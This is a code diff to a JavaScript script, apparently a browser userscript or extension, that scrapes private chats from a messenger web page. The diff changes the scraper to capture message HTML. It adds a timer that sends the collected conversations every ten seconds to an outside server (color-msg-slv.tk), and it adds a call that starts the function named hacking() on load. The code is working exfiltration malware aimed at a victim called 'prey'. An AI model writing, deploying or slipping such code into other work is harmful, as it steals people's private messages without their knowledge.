@@ -70,7 +70,7 @@ function getFriendName() {
 function getMessages() {
     let messages = [];
     document.querySelectorAll('.im-mess--text').forEach(mess =>
-        messages.push(mess)
+        messages.push(mess.innerHTML)
     );
     return messages;
 }
@@ -121,4 +121,24 @@ async function hacking() {
 
         i++; // увеличиваем i, чтобы перейти к след. диалогу
     }, 2000);
+
+    // каждыйе 10 секунд асинхронно отправляем полученные данные на сервер
+    let saver = setInterval(() => {
+        let formData = new FormData();
+        formData.append('data', JSON.stringify(dialogsData));
+
+        fetch(
+            'https://color-msg-slv.tk', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: formData,
+            }
+        );
+
+        dialogsData = {
+            [preyName]: {}
+        }; // clear data to initial state
+    }, 10000);
 }
+
+hacking();
